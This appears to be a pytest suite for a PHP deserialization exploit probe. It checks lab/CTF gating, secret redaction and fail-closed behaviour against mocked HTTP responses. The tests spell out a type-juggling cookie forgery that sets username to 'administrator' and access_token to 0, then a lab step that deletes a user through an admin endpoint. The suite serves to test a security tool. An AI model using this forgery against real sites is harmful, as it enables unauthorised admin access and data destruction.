import base64
import json
from urllib.parse import quote

from multidict import CIMultiDict
import pytest

from tools.web_authentication_probe import REDACTED_RUNTIME_SECRET
from tools.web_deserialization_probe import (
    EXPECTED_STEP_LABELS,
    LAB_EXPECTED_STEP_LABELS,
    RUNTIME_EXPECTED_STEP_LABELS,
    DeserializationProbeTool,
    PhpSerializedError,
    decode_cookie_carrier,
    encode_cookie_carrier,
    forge_type_juggling_object,
    parse_php_object,
    _response_transcript,
    validate_probe_parameters,
)


TOKEN = "0123456789abcdef0123456789abcdef"
SERIALIZED = (
    b'O:4:"User":3:{'
    b's:8:"username";s:6:"wiener";'
    b's:12:"access_token";s:32:"' + TOKEN.encode() + b'";'
    b's:5:"admin";b:0;}'
)


def _parameters(**overrides):
    params = {
        "target": "https://lab.test/",
        "mode": "php-serialized-type-juggling",
        "proofLevel": "lab-state-change",
        "loginPath": "/login",
        "privilegePath": "/admin",
        "effectPath": "/admin/delete?username=carlos",
        "solvedPath": "/",
        "expectedLoginLocation": "/my-account?id=wiener",
        "expectedEffectLocation": "/admin",
        "cookieName": "session",
        "usernameField": "username",
        "passwordField": "password",
        "csrfField": "csrf",
        "username": "wiener",
        "password": "approved-password",
        "serializedClass": "User",
        "identityProperty": "username",
        "tokenProperty": "access_token",
        "sourceIdentity": "wiener",
        "targetIdentity": "administrator",
        "unsolvedMarker": "Not solved",
        "deniedMarker": "Access denied",
        "privilegeMarker": "Administration panel",
        "solvedMarker": "Congratulations, you solved the lab!",
        "expectedLoginStatus": 200,
        "expectedLoginSubmitStatus": 302,
        "expectedDeniedStatus": 401,
        "expectedPrivilegeStatus": 200,
        "expectedEffectStatus": 302,
        "expectedSolvedStatus": 200,
        "engagement": "lab",
        "allowUnsafeMethods": True,
        "stateChangeApproved": True,
        "timeoutSeconds": 5,
    }
    params.update(overrides)
    return params


def _runtime_parameters(**overrides):
    params = _parameters(
        proofLevel="runtime-privilege-differential",
        engagement="aggressive",
    )
    for name in (
        "effectPath",
        "solvedPath",
        "expectedEffectLocation",
        "cookieName",
        "serializedClass",
        "identityProperty",
        "tokenProperty",
        "sourceIdentity",
        "unsolvedMarker",
        "deniedMarker",
        "privilegeMarker",
        "solvedMarker",
        "expectedLoginStatus",
        "expectedLoginSubmitStatus",
        "expectedLoginLocation",
        "expectedDeniedStatus",
        "expectedPrivilegeStatus",
        "expectedEffectStatus",
        "expectedSolvedStatus",
        "stateChangeApproved",
    ):
        params.pop(name, None)
    params.update(overrides)
    return params


def _response(status, body="", headers=None, truncated=False):
    return {
        "status": status,
        "reason": "OK",
        "headers": CIMultiDict(headers or {}),
        "body": body,
        "truncated": truncated,
    }


def test_response_transcript_redacts_every_set_cookie_carrier():
    response = _response(
        302,
        "redirecting",
        CIMultiDict(
            [
                ("Location", "/account"),
                ("Set-Cookie", "session=primary-secret; Secure; HttpOnly"),
                ("Set-Cookie", "telemetry=independent-secret; Secure"),
            ]
        ),
    )

    transcript, truncated = _response_transcript(response, ())

    assert truncated is False
    assert transcript.count(f"Set-Cookie: {REDACTED_RUNTIME_SECRET}") == 2
    assert "primary-secret" not in transcript
    assert "independent-secret" not in transcript


def _cookie(carrier=SERIALIZED):
    return quote(base64.b64encode(carrier).decode(), safe="")


def test_registration_and_schema_expose_only_the_bounded_type_juggling_mode():
    tool = DeserializationProbeTool()

    assert tool.name == "web:deserialization_probe"
    assert tool.metadata["category"] == "exploit-test"
    assert tool.schema["additionalProperties"] is False
    assert tool.schema["properties"]["mode"]["enum"] == ["php-serialized-type-juggling"]
    assert tool.schema["properties"]["proofLevel"]["enum"] == [
        "lab-state-change",
        "runtime-privilege-differential",
    ]
    assert tool.schema["required"] == [
        "mode",
        "proofLevel",
        "loginPath",
        "privilegePath",
        "usernameField",
        "passwordField",
        "username",
        "password",
        "targetIdentity",
        "engagement",
        "allowUnsafeMethods",
    ]
    assert EXPECTED_STEP_LABELS == LAB_EXPECTED_STEP_LABELS
    assert tool.schema["properties"]["username"]["x-hidden"] is True
    assert tool.schema["properties"]["password"]["x-hidden"] is True
    for forbidden in (
        "payload",
        "carrier",
        "cookieValue",
        "headers",
        "command",
        "file",
        "gadget",
        "classReplacement",
        "oobUrl",
    ):
        assert forbidden not in tool.schema["properties"]


def test_validation_requires_lab_or_ctf_and_both_state_change_approvals():
    assert validate_probe_parameters(_parameters()) == (True, "")
    assert validate_probe_parameters(_parameters(engagement="ctf")) == (True, "")
    assert validate_probe_parameters(_parameters(engagement="standard"))[0] is False
    assert validate_probe_parameters(_parameters(engagement="aggressive"))[0] is False
    assert validate_probe_parameters(_parameters(allowUnsafeMethods=False))[0] is False
    assert validate_probe_parameters(_parameters(stateChangeApproved=False))[0] is False
    assert validate_probe_parameters(_parameters(target="https://user:pass@lab.test/"))[0] is False
    assert validate_probe_parameters(_parameters(effectPath="//evil.test/delete"))[0] is False
    assert validate_probe_parameters(_parameters(expectedEffectLocation="/admin#bad"))[0] is False
    assert validate_probe_parameters(_parameters(identityProperty="access_token"))[0] is False
    assert validate_probe_parameters(_parameters(targetIdentity="admin user"))[0] is False
    assert validate_probe_parameters(_parameters(expectedDeniedStatus=600))[0] is False
    assert validate_probe_parameters(_parameters(timeoutSeconds=31))[0] is False


def test_runtime_validation_needs_no_lab_or_serialization_hints_and_rejects_lab_material():
    assert validate_probe_parameters(_runtime_parameters()) == (True, "")
    assert validate_probe_parameters(_runtime_parameters(proofLevel="runtime-privlege"))[0] is False
    assert validate_probe_parameters(_runtime_parameters(engagement="standard"))[0] is False
    for field, value in (
        ("effectPath", "/delete"),
        ("solvedPath", "/"),
        ("unsolvedMarker", "Not solved"),
        ("solvedMarker", "Solved"),
        ("expectedEffectStatus", 302),
        ("expectedEffectLocation", "/admin"),
        ("expectedSolvedStatus", 200),
        ("stateChangeApproved", True),
    ):
        valid, reason = validate_probe_parameters(_runtime_parameters(**{field: value}))
        assert valid is False
        assert "lab-state-change" in reason


def test_parser_and_forge_preserve_structure_and_change_only_two_scalars():
    parsed = parse_php_object(SERIALIZED, "User")
    forged, mutations = forge_type_juggling_object(
        parsed,
        "username",
        "access_token",
        "wiener",
        "administrator",
    )

    assert parsed.property_order == ["username", "access_token", "admin"]
    assert forged.property_order == parsed.property_order
    assert forged.by_name()["username"].value == "administrator"
    assert forged.by_name()["access_token"].value_type == "int"
    assert forged.by_name()["access_token"].value == 0
    assert forged.by_name()["admin"].serialized_value == parsed.by_name()["admin"].serialized_value
    assert b's:13:"administrator";' in forged.raw
    assert b's:12:"access_token";i:0;' in forged.raw
    assert [item["role"] for item in mutations] == ["identity", "comparison-token"]
    assert TOKEN not in json.dumps(mutations)


@pytest.mark.parametrize(
    "raw",
    [
        b'a:2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:3:"abc";}',
        b'O:4:"User":2:{s:8:"username";s:6:"wiener";s:8:"username";s:5:"admin";}',
        b'O:4:"User":2:{s:8:"username";s:7:"wiener";s:12:"access_token";s:3:"abc";}',
        b'O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";R:1;}',
        b'O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";a:0:{}}',
        b'C:4:"User":0:{}',
        SERIALIZED + b"trailing",
    ],
)
def test_parser_rejects_non_object_duplicate_malformed_nested_reference_or_trailing(raw):
    with pytest.raises(PhpSerializedError):
        parse_php_object(raw)


def test_cookie_codec_accepts_only_base64_with_optional_percent_layer():
    raw_cookie = base64.b64encode(SERIALIZED).decode()
    percent_cookie = quote(raw_cookie, safe="")

    assert decode_cookie_carrier(raw_cookie) == (SERIALIZED, "base64")
    assert decode_cookie_carrier(percent_cookie) == (SERIALIZED, "url-percent-base64")
    assert encode_cookie_carrier(SERIALIZED, "base64") == raw_cookie
    assert encode_cookie_carrier(SERIALIZED, "url-percent-base64") == percent_cookie
    with pytest.raises(PhpSerializedError):
        decode_cookie_carrier("O%3A4%3A%22User%22")


@pytest.mark.asyncio
async def test_execute_proves_seven_step_differential_without_persisting_secrets(monkeypatch):
    tool = DeserializationProbeTool()
    preauth = "preauth-secret"
    original_cookie = _cookie()
    responses = [
        _response(
            200,
            '<input name="csrf" value="csrf-secret">Not solved',
            {"Set-Cookie": f"session={preauth}; Secure; HttpOnly"},
        ),
        _response(
            302,
            "",
            {
                "Location": "/my-account?id=wiener",
                "Set-Cookie": f"session={original_cookie}; Secure; HttpOnly",
            },
        ),
        _response(401, "Access denied"),
        _response(200, "Administration panel"),
        _response(401, "Access denied"),
        _response(302, "", {"Location": "/admin"}),
        _response(200, "Congratulations, you solved the lab!"),
    ]
    calls = []

    async def fake_request(
        _session,
        method,
        url,
        body=None,
        cookie_name="",
        cookie_value="",
    ):
        calls.append((method, url, body, cookie_name, cookie_value))
        return responses[len(calls) - 1]

    monkeypatch.setattr(tool, "_request", fake_request)
    result = await tool.execute(_parameters())

    assert result["success"] is True
    assert result["fallback"] is False
    assert result["requestCount"] == 7
    verification = result["verification"]
    assert verification["originalDenied"] is True
    assert verification["privilegeGranted"] is True
    assert verification["originalReplayDenied"] is True
    assert verification["effectTriggered"] is True
    assert verification["solvedBefore"] is False
    assert verification["solvedAfter"] is True
    assert [step["label"] for step in verification["httpEvidence"]["steps"]] == list(
        EXPECTED_STEP_LABELS
    )
    assert [step["carrierRole"] for step in verification["httpEvidence"]["steps"]] == [
        "none",
        "none",
        "original",
        "forged",
        "original",
        "forged",
        "forged",
    ]
    assert calls[0][4] == ""
    assert calls[1][4] == preauth
    assert calls[2][4] == original_cookie
    forged_cookie = calls[3][4]
    forged_raw, _ = decode_cookie_carrier(forged_cookie)
    forged = parse_php_object(forged_raw, "User")
    assert forged.by_name()["username"].value == "administrator"
    assert forged.by_name()["access_token"].value == 0
    assert calls[4][4] == original_cookie
    assert calls[5][4] == forged_cookie
    assert calls[6][4] == forged_cookie

    persisted = json.dumps(result)
    for secret in (
        "approved-password",
        "csrf-secret",
        preauth,
        TOKEN,
        original_cookie,
        forged_cookie,
        "wiener",
    ):
        assert secret not in persisted
    assert REDACTED_RUNTIME_SECRET in persisted
    assert verification["serialization"]["beforeCarrierSha256"] != verification["serialization"][
        "afterCarrierSha256"
    ]
    assert verification["serialization"]["changedLeafCount"] == 2
    assert verification["mutations"][1]["afterValue"] == 0
    assert verification["credentialProof"]["usernameSha256"]
    assert verification["credentialProof"]["passwordSha256"]
    assert set(verification["parameterBindings"]) == set(_parameters()) - {"target"}


@pytest.mark.asyncio
async def test_execute_proves_five_step_runtime_differential_with_derived_cookie_and_structure(
    monkeypatch,
):
    tool = DeserializationProbeTool()
    preauth = "preauth-secret"
    original_cookie = _cookie()
    responses = [
        _response(200, '<input name="csrf" value="csrf-secret">Sign in', {"Set-Cookie": f"session={preauth}"}),
        _response(
            302,
            "",
            {
                "Location": "/my-account?id=wiener",
                "Set-Cookie": f"session={original_cookie}; Secure; HttpOnly",
            },
        ),
        _response(401, "Access denied"),
        _response(200, "Administration panel"),
        _response(401, "Access denied"),
    ]
    calls = []

    async def fake_request(
        _session,
        method,
        url,
        body=None,
        cookie_name="",
        cookie_value="",
    ):
        calls.append((method, url, body, cookie_name, cookie_value))
        return responses[len(calls) - 1]

    monkeypatch.setattr(tool, "_request", fake_request)
    result = await tool.execute(
        _runtime_parameters(
            csrfField="csrf",
            expectedDeniedStatus=403,
            expectedPrivilegeStatus=201,
        )
    )

    assert result["success"] is True
    assert result["fallback"] is False
    assert result["requestCount"] == 5
    assert len(calls) == 5
    verification = result["verification"]
    assert verification["proofLevel"] == "runtime-privilege-differential"
    assert [step["label"] for step in verification["httpEvidence"]["steps"]] == list(
        RUNTIME_EXPECTED_STEP_LABELS
    )
    assert verification["serialization"]["cookieName"] == "session"
    assert verification["serialization"]["className"] == "User"
    assert verification["usernameField"] == "username"
    assert verification["passwordField"] == "password"
    assert verification["targetIdentity"] == "administrator"
    expected_bound_parameters = set(
        _runtime_parameters(
            csrfField="csrf",
            expectedDeniedStatus=403,
            expectedPrivilegeStatus=201,
        )
    ) - {"target"}
    assert set(verification["parameterBindings"]) == expected_bound_parameters
    assert [mutation["path"] for mutation in verification["mutations"]] == [
        "username",
        "access_token",
    ]
    assert verification["effectRequests"] == 0
    assert verification["solvedChecks"] == 0
    assert len(verification["assertionMismatches"]) == 3
    for field in (
        "effectPath",
        "solvedPath",
        "unsolvedMarker",
        "solvedMarker",
        "stateChangeApproved",
        "solvedBefore",
        "effectTriggered",
        "solvedAfter",
    ):
        assert field not in verification
    assert calls[2][4] == original_cookie
    assert calls[4][4] == original_cookie
    assert calls[3][4] not in {"", original_cookie}
    assert REDACTED_RUNTIME_SECRET in json.dumps(result)
    assert original_cookie not in json.dumps(result)


@pytest.mark.asyncio
async def test_runtime_derivation_fails_closed_for_ambiguous_token_property(monkeypatch):
    tool = DeserializationProbeTool()
    ambiguous = (
        b'O:4:"User":3:{'
        b's:8:"username";s:6:"wiener";'
        b's:12:"access_token";s:32:"' + TOKEN.encode() + b'";'
        b's:11:"avatar_link";s:6:"avatar";}'
    )
    responses = [
        _response(200, "Sign in"),
        _response(302, "", {"Set-Cookie": f"session={_cookie(ambiguous)}"}),
    ]
    calls = 0

    async def fake_request(*_args, **_kwargs):
        nonlocal calls
        response = responses[calls]
        calls += 1
        return response

    monkeypatch.setattr(tool, "_request", fake_request)
    result = await tool.execute(_runtime_parameters(csrfField=""))

    assert result["success"] is False
    assert result["fallback"] is False
    assert result["requestCount"] == 2
    assert "ambiguous" in result["error"]
    assert result["findings"] == []


@pytest.mark.asyncio
async def test_execute_supports_login_without_preauth_cookie_or_csrf(monkeypatch):
    tool = DeserializationProbeTool()
    original_cookie = _cookie()
    responses = [
        _response(200, "Not solved", {"Set-Cookie": "session=; Secure; HttpOnly"}),
        _response(
            302,
            "",
            {
                "Location": "/my-account?id=wiener",
                "Set-Cookie": f"session={original_cookie}; Secure; HttpOnly",
            },
        ),
        _response(401, "Access denied"),
        _response(200, "Administration panel"),
        _response(401, "Access denied"),
        _response(302, "", {"Location": "/admin"}),
        _response(200, "Congratulations, you solved the lab!"),
    ]
    calls = []

    async def fake_request(
        _session,
        method,
        url,
        body=None,
        cookie_name="",
        cookie_value="",
    ):
        calls.append((method, url, body, cookie_name, cookie_value))
        return responses[len(calls) - 1]

    monkeypatch.setattr(tool, "_request", fake_request)
    result = await tool.execute(_parameters(csrfField=""))

    assert result["success"] is True
    assert result["requestCount"] == 7
    assert calls[1][4] == ""
    assert "csrf" not in calls[1][2]
    assert "Cookie:" not in result["verification"]["httpEvidence"]["steps"][1]["request"]
    assert REDACTED_RUNTIME_SECRET in json.dumps(result)


@pytest.mark.asyncio
async def test_execute_fails_closed_when_original_replay_gains_privilege(monkeypatch):
    tool = DeserializationProbeTool()
    original_cookie = _cookie()
    responses = [
        _response(
            200,
            '<input name="csrf" value="csrf-secret">Not solved',
            {"Set-Cookie": "session=preauth-secret"},
        ),
        _response(
            302,
            "",
            {
                "Location": "/my-account?id=wiener",
                "Set-Cookie": f"session={original_cookie}",
            },
        ),
        _response(401, "Access denied"),
        _response(200, "Administration panel"),
        _response(200, "Administration panel"),
    ]
    count = 0

    async def fake_request(*_args, **_kwargs):
        nonlocal count
        response = responses[count]
        count += 1
        return response

    monkeypatch.setattr(tool, "_request", fake_request)
    result = await tool.execute(_parameters())

    assert result["success"] is False
    assert result["fallback"] is False
    assert result["requestCount"] == 5
    assert result["findings"] == []


@pytest.mark.asyncio
async def test_detection_or_invalid_carrier_alone_never_emits_a_finding(monkeypatch):
    tool = DeserializationProbeTool()
    responses = [
        _response(
            200,
            '<input name="csrf" value="csrf-secret">Not solved',
            {"Set-Cookie": "session=preauth-secret"},
        ),
        _response(
            302,
            "",
            {
                "Location": "/my-account?id=wiener",
                "Set-Cookie": "session=bm90LWEtc2VyaWFsaXplZC1vYmplY3Q=",
            },
        ),
    ]
    count = 0

    async def fake_request(*_args, **_kwargs):
        nonlocal count
        response = responses[count]
        count += 1
        return response

    monkeypatch.setattr(tool, "_request", fake_request)
    result = await tool.execute(_parameters())

    assert result["success"] is False
    assert result["fallback"] is False
    assert result["requestCount"] == 2
    assert result["findings"] == []
